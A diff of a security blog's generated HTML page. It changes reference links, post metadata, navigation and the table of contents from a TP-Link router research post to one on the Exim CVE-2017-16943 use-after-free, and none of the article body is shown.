-<li><a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly" target="_blank" rel="external">http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly</a></li>
-<li><a href="https://www.kanxue.com/article-read-218.htm" target="_blank" rel="external">https://www.kanxue.com/article-read-218.htm</a></li>
-<li><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h</a></li>
-<li><a href="http://asm.sourceforge.net/syscall.html" target="_blank" rel="external">http://asm.sourceforge.net/syscall.html</a></li>
-<li><a href="https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h" target="_blank" rel="external">https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h</a></li>
+<li><a href="https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/" target="_blank" rel="external">https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/</a></li>
 </ol>
 
       
@@ -379,13 +362,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/10/30/0x3B/">TP-Link WR941N路由器研究</a></p>
+        <p><span>本文标题:</span><a href="/2017/12/08/0x3F/">CVE-2017-16943 Exim UAF漏洞分析--后续</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
-        <p><span>发布时间:</span>2017-10-30, 11:07:10</p>
-        <p><span>最后更新:</span>2017-11-09, 18:12:59</p>
+        <p><span>发布时间:</span>2017-12-08, 14:15:55</p>
+        <p><span>最后更新:</span>2017-12-13, 15:48:51</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/10/30/0x3B/" title="TP-Link WR941N路由器研究">http://0x48.pw/2017/10/30/0x3B/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2017/10/30/0x3B/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/12/08/0x3F/" title="CVE-2017-16943 Exim UAF漏洞分析--后续">http://0x48.pw/2017/12/08/0x3F/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2017/12/08/0x3F/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -398,16 +381,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/11/03/0x3C/">
-                    看雪CTF 第四题club_pwn writeup
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/10/04/0x3A/">
-                    Pwnhub 2013的国庆 writeup
+                <a href="/2017/12/01/0x3E/">
+                    CVE-2017-16943 Exim UAF漏洞分析
                 </a>
             </div>
         
@@ -418,7 +395,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Day-1"><span class="toc-number">1.</span> <span class="toc-text">Day 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Day-2"><span class="toc-number">2.</span> <span class="toc-text">Day 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Day-3"><span class="toc-number">3.</span> <span class="toc-text">Day 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Day-4"><span class="toc-number">4.</span> <span class="toc-text">Day 4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shellcode编写"><span class="toc-number">5.</span> <span class="toc-text">Shellcode编写</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#重新复现漏洞"><span class="toc-number">1.</span> <span class="toc-text">重新复现漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析特殊配置下的触发流程"><span class="toc-number">1.1.</span> <span class="toc-text">分析特殊配置下的触发流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#默认配置情况下复现漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">默认配置情况下复现漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">2.</span> <span class="toc-text">参考链接</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -469,15 +446,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/11/03/0x3C/" title="上一篇: 看雪CTF 第四题club_pwn writeup">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/10/04/0x3A/" title="下一篇: Pwnhub 2013的国庆 writeup">
+            <a href="/2017/12/01/0x3E/" title="下一篇: CVE-2017-16943 Exim UAF漏洞分析">
                 <i class="fa fa-angle-right"></i>
             </a>
         
